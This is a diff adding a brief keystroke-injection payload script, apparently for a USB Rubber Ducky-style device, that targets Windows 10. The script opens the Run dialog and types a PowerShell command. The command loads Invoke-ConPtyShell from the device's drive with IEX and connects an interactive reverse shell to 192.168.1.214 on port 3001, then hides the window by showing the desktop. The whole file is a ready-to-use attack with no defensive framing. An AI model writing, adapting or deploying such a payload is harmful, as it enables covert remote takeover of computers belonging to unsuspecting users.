@@ -1,0 +1,13 @@
+REM Create a ConPtyShell on a Windows 10 Machine
+REM Author: Harrison Kee (N3rdKing13)
+REM Date: 20210720
+REM Props: swissky (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell IEX(IWR F:OtherScripts\Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.214 3001
+ENTER
+DELAY 200
+GUI d
